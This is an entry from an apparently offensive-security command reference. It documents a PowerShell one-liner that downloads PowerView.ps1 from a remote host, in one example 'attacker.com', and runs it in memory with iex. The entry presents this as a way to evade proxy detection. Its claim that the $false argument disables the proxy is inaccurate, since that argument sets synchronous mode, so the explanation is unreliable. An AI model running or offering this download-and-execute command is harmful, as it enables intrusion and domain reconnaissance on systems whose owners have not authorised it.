---
type: command
executor: powershell
data: >-
  $h = new-object -com WinHttp.WinHttpRequest.5.1; $h.open('GET',
  '$_URL/PowerView.ps1', $false); $h.send(); iex $h.responseText
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - powershell
  - download-execute
  - non-proxy
verified: true
validated: true
---

# Download-and-Execute-PowerView-Non-Proxy-Aware

## Command

```powershell
$h = new-object -com WinHttp.WinHttpRequest.5.1; $h.open('GET', '$_URL/PowerView.ps1', $false); $h.send(); iex $h.responseText
```

## Description

This command uses the WinHttp.WinHttpRequest COM object to download the PowerView.ps1 script from a remote URL without proxy involvement, then executes it via Invoke-Expression (iex). The $false parameter ensures no proxy is used. Ideal for direct internet access scenarios to avoid proxy detection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_URL | Base URL or IP hosting the PowerView.ps1 file (e.g., http://10.10.10.10) | Yes |
| $false | Disables proxy usage in the open method | Yes |

## Examples

### Basic Usage

```powershell
$h = new-object -com WinHttp.WinHttpRequest.5.1; $h.open('GET', 'http://attacker.com/PowerView.ps1', $false); $h.send(); iex $h.responseText
```

## Expected Output

Silent on success; script loads into memory. Test with `Get-NetDomain` to confirm (returns domain details). Potential errors: Network connectivity issues or invalid URL.

## Related

- [[commands/Download-and-Execute-PowerView-Proxy-Aware]]
- [[procedures/Download-and-Execute-PowerView-Script]]
